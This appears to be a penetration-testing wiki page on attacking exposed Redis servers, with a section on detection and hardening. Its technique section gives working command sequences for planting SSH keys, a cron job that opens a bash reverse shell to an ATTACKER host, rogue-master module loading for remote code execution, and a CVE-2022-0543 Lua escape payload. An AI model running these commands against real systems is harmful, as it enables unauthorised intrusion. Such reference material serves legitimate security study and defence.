---
title: Redis enumeration
slug: redis-enum
---

> **TL;DR:** TCP/6379. Unauthenticated instances are still everywhere. Once you can issue commands, write SSH keys via `CONFIG SET dir`, drop cron jobs, load malicious modules, or chain `SLAVEOF`/`REPLICAOF` for RCE.

## What it is
Redis is an in-memory key-value store that historically shipped with no authentication and bound to all interfaces. Even with auth, the command set is dangerous — `CONFIG SET dir` plus `CONFIG SET dbfilename` plus `SAVE` writes the keyspace to an attacker-chosen path; `MODULE LOAD` runs arbitrary native code from a `.so`; `REPLICAOF` (the renamed `SLAVEOF`) pulls a module from an attacker-controlled "master" and loads it. SSRF-from-web-app to Redis is the same primitive — many of the most impactful RCEs in modern CTFs and bug bounties (CVE-2022-0543 Debian Lua sandbox escape, the `master/replica` RCE class) reduce to "I can speak Redis."

## Preconditions / where it applies
- TCP/6379 reachable (direct, via SSRF, or via a misconfigured exposed admin panel).
- No `requirepass` set, or known/leaked password, or `protected-mode no` with an open bind.
- Redis runs with write access to a useful path: `~/.ssh/`, `/var/spool/cron/`, the webroot, or a module dir.
- Related: [[exposed-services]], [[ssh-enum]], [[known-cve-triage]].

## Technique
Probe and fingerprint:

```bash
nmap -sV -p6379 --script=redis-info,redis-brute TARGET
redis-cli -h TARGET INFO
redis-cli -h TARGET CONFIG GET '*'
```

If `CONFIG` is allowed, the SSH-key write is the most reliable Linux RCE primitive:

```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
redis-cli -h TARGET FLUSHALL
cat key.txt | redis-cli -h TARGET -x SET payload
redis-cli -h TARGET CONFIG SET dir /home/redis/.ssh/
redis-cli -h TARGET CONFIG SET dbfilename authorized_keys
redis-cli -h TARGET SAVE
ssh -i ~/.ssh/id_rsa redis@TARGET
```

Cron drop (when Redis runs as a user with write to `/var/spool/cron/`):

```bash
redis-cli -h TARGET FLUSHALL
redis-cli -h TARGET SET pwn "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
redis-cli -h TARGET CONFIG SET dir /var/spool/cron/
redis-cli -h TARGET CONFIG SET dbfilename root
redis-cli -h TARGET SAVE
```

Master-replica module RCE — modern, works even when `CONFIG` is partially restricted as long as `REPLICAOF` and `MODULE LOAD` exist. Stand up `redis-rogue-server` or `RedisModules-ExecuteCommand`, then:

```bash
redis-cli -h TARGET REPLICAOF ATTACKER 6379
# rogue master ships exp.so to the victim via replication
redis-cli -h TARGET MODULE LOAD /tmp/exp.so
redis-cli -h TARGET system.exec 'id'
```

Lua sandbox escape (CVE-2022-0543) — Debian/Ubuntu Redis packages mis-sandboxed `package`, letting `EVAL "..."` reach `os.execute`:

```text
redis-cli -h TARGET EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); return f:read("*a")' 0
```

SSRF→Redis works because the protocol is line-based: a `gopher://` or CRLF-injecting HTTP request smuggles `SET`/`CONFIG`/`SAVE` over an HTTP socket the server thinks is Redis traffic.

## Detection and defence
- Log `CONFIG SET`, `MODULE LOAD`, `REPLICAOF`, `SLAVEOF`, and bulk `SAVE`/`BGSAVE` from non-replication clients. Any of these from an application user is a finding.
- Set `requirepass` to a strong value (ideally ACL users in Redis 6+ with command restrictions), bind to localhost or a private interface, enable `protected-mode yes`, run as a dedicated low-priv user with no shell and no SSH keys, and use `rename-command CONFIG ""`, `rename-command MODULE ""`.
- TLS (`tls-port`) plus mutual auth. Patch — Debian's Lua bug, the slaveof RCE, and several DoS bugs are years old but still alive on internal estates.
- Network: never expose 6379 to the internet; egress filter so SSRF from web apps cannot reach Redis ports.

## References
- [HackTricks — 6379 Redis](https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html) — SSH-key, cron, module, and rogue-master chains.
- [Redis Security](https://redis.io/docs/management/security/) — upstream hardening guide.
- [Antirez — A few things about Redis security](http://antirez.com/news/96) — why the default bind/auth were dangerous and what changed.
